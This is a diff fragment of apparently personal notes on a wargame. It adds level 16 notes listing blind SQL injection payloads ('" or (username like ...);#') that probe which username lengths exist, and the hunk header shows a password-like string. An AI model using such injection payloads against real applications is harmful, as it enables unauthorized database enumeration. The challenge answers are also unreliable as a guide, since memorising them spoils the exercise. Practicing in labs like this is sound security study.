@@ -511,7 +511,18 @@ TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
 
 lvl 16:
 -----------
+started with or like injecting to
+find user name min & max lenghs
 
+" or (username like '_');# ==> user doesn't exist
+" or (username like '__');# ==> user doesn't exist
+" or (username like '___');# ==> user does exist !!!!
+" or (username like '____');# ==> user doesn't exist
+" or (username like '_____');# ==> user does exist
+....
+7 letters exists
+....
+users with 3, 5 & 7 letters exist
 
 lvl 17:
 -----------
